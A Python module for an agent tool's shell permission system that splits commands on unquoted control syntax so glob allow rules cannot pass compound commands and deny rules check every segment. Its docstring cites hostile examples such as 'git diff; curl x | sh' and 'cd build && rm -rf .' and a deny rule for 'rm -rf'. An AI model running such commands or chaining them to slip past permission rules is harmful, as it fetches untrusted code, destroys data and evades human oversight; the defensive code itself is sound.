"""Shell control-syntax detection for glob permission rules.

A glob rule such as ``shell(git diff*)`` compiles to an anchored ``.*`` regex over
the whole command string, so it also matched ``git diff; curl x | sh``. This
module finds unquoted control syntax so :mod:`nexus.tools.permissions` can

* refuse to auto-allow a compound command through a glob **allow** rule, and
* test glob **deny** and **ask** rules against every segment of a compound
  command, so ``shell(rm -rf*)`` also blocks ``cd build && rm -rf .``.

This is a conservative lexer, not a shell parser and not a sandbox. Anything it
cannot understand (an unterminated quote) is reported as compound, which only
ever makes a command ask or match more rules, never fewer.
"""
from __future__ import annotations

__all__ = ["analyze_command"]

#: Characters that always end a segment when they are unquoted.
_SEPARATORS = frozenset(";|\n")
#: Maximum segments kept; the rest are folded into the last one so a hostile
#: command cannot make rule evaluation arbitrarily slow.
_MAX_SEGMENTS = 64


def analyze_command(command: str) -> tuple[tuple[str, ...], bool]:
    """Split ``command`` on unquoted control syntax.

    Returns ``(segments, compound)``. ``compound`` is true when the command holds
    any unquoted ``;``, ``&`` (other than a redirection such as ``2>&1`` or
    ``&>``), ``|``, newline, subshell ``(``, ``$(``, ``<(``, ``>(`` or backtick,
    when ``$(``/backtick appears inside double quotes (still executed), or when a
    quote is left open. ``segments`` are the non-empty stripped pieces; for a
    simple command that is just the stripped command itself.
    """
    segments: list[str] = []
    current: list[str] = []
    compound = False
    quote = ""  # "", "'" or '"'
    i = 0
    n = len(command)

    def cut() -> None:
        piece = "".join(current).strip()
        current.clear()
        if piece:
            segments.append(piece)

    while i < n:
        char = command[i]
        nxt = command[i + 1] if i + 1 < n else ""
        if quote == "'":
            current.append(char)
            if char == "'":
                quote = ""
            i += 1
            continue
        if char == "\\":
            current.append(char)
            if nxt:
                current.append(nxt)
            i += 2
            continue
        if quote == '"':
            if char == '"':
                quote = ""
                current.append(char)
            elif char == "`" or (char == "$" and nxt == "("):
                compound = True
                cut()
                i += 2 if char == "$" else 1
                continue
            else:
                current.append(char)
            i += 1
            continue
        # Unquoted from here on.
        if char in "'\"":
            quote = char
            current.append(char)
        elif char in _SEPARATORS:
            compound = True
            cut()
        elif char == "&":
            previous = command[i - 1] if i else ""
            if previous in ("<", ">") or nxt == ">":
                current.append(char)  # redirection (2>&1, >&2, &>file)
            else:
                compound = True
                cut()
        elif char == "`":
            compound = True
            cut()
        elif char == "$" and nxt == "(":
            compound = True
            cut()
            i += 2
            continue
        elif char in ("<", ">") and nxt == "(":
            compound = True
            cut()
            i += 2
            continue
        elif char in ("(", ")"):
            compound = True
            cut()
        else:
            current.append(char)
        i += 1
    if quote:
        compound = True
    cut()
    if len(segments) > _MAX_SEGMENTS:
        segments = [*segments[: _MAX_SEGMENTS - 1], " ".join(segments[_MAX_SEGMENTS - 1 :])]
    return tuple(segments), compound
